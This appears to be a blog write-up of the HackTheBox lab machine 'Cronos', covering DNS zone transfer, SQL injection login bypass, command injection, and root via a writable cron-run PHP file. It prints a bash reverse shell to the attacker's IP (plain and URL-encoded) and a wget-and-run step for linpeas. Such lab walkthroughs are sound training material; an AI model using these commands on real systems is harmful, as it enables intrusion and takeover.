---
title: Cronos Writeup - HackTheBox -
date: "2023-03-23T12:00:00.000Z"
template: "post"
draft: false
slug: "cronos-writeup"
category: "Security"
tags:
  - "Security"
  - "HackTheBox"
description: "Writeups of Cronos machine in HackTheBox"
socialImage: "/media/cronos-writesup/cronos.png"
---

![cronos](/media/cronos-writesup/cronos.png)

This is a writeup of [Cronos](https://app.hackthebox.com/machines/Cronos) machine, which has a `medium` level.

1. [Enumeration](#enumeration)
2. [User Flag](#user-flag)
3. [Priviledge Escalation](#priviledge-escalation)

## Enumeration
`nmap` found 3 open ports, 22(SSH), 53(DNS), 80(HTTP).

![nmap](/media/cronos-writesup/nmap.png)

When I go to `10.10.10.13` in browser, I see the apache default page.

![apache](/media/cronos-writesup/apache_80.png)

I tries to check if there are any pages with `gobuster`, but doesn't find anything.

![gobuster_10101013](/media/cronos-writesup/gobuster_10101013.png)

It might be the case that I have to resolve ip with a domain.
`nslookup` finds `ns1.cronos.htb` domain.

![nslookup](/media/cronos-writesup/nslookup.png)

I learned DNS Zone Transfers in [Footprint module](https://academy.hackthebox.com/module/112/section/1069).
Since port `53` is opened, I try to find other domains. There is additionally `admin.cronos.htb` domain.

![zone_transfer](/media/cronos-writesup/zone_transfer.png)

Now I set these domains in `/etc/hosts` file to resolve these domains.
```
10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb
```

When I go to `cronos.htb` page, there is a webpage. However, there is nothing special.

![cronos.htb](/media/cronos-writesup/cronos_htb.png)

`gobuster` doesn't find any pages, either. 

![gobuster_cronos_htb](/media/cronos-writesup/gobuster_cronos_htb.png)

Now it's time to go to `admin.cronos.htb` page. There is a login page.
It can be the initial foothold.

![admin.cronos.htb](/media/cronos-writesup/admin_cronos_htb.png)

## User Flag
As the first attempt, I tries to do a basic sql injection.

![sql_injection](/media/cronos-writesup/sql_injection.png)

Surprisingly, it works. there is a page where I can execute `traceroute` command. 
But, when I click the `execute!` button, it doesn't show anything.

![admin_page](/media/cronos-writesup/admin_page.png)

Now it's time to use `Burpsuite`. I try to change the `command` parameter and make `host` parameter empty.

![burpsuite_ls](/media/cronos-writesup/burpsuite_ls.png)

It returns a file list. So, this endpoint has a `command injection vulnerability` so that I can execute shell commands by changing the request parameter.

![burpsuite_ls_result](/media/cronos-writesup/burpsuite_ls_result.png)

It's time to do a reverse shell. I use the command below. `10.10.16.2` is my machine ip address.
```
/bin/bash -i >& /dev/tcp/10.10.16.2/1234 0>&1
```

In order to execute the reverse shell command, the command needs to be url-encoded like this below.
```
%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.2%2F1234%200%3E%261%0A
```

![burpsuite_reverse_shell](/media/cronos-writesup/burpsuite_reverse_shell.png)

I get the reverse shell!

![reverse_shell](/media/cronos-writesup/reverse_shell.png)

The shell is without TTY, so I spawn TTY shell. The detail about `Shell spawning` is written [here](https://rcenetsec.com/shell-spawning/).

![spawn_tty](/media/cronos-writesup/spawn_tty.png)

I'm a `www-data` user, but can read `user.txt`.

![user_txt](/media/cronos-writesup/user_txt.png)


## Priviledge Escalation
To find any hints for priviledge escalation, I use `linpeas.sh`.
I run a python server in the directory where `linpeas.sh` exists in my machine.
```
python3 -m http.server 80
```

Then, download and execute it in the target machine.
```
wget http://10.10.16.2/linpeas.sh
chmod +x linpeas.sh
bash linpeas.sh
```

`linpeas.sh` finds a cron job that executes `artisan` file with the root user.
This cron is executed every minute.

![crontab](/media/cronos-writesup/crontab.png)

`artisan` file is a php script.

![file_artisan](/media/cronos-writesup/file_artisan.png)

So, by replacing `artisan` file with a php reverse shell, I can get a root shell.
I download [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) in my machine and change `$ip` into my machine and `$port` into `9999`.
Now download the php reverse shell in the target machine and rename it into `artisan`.

![download_artisan](/media/cronos-writesup/download_artisan.png)

When the cron executes `artisan` file, I get a root shell!

![get_root](/media/cronos-writesup/get_root.png)

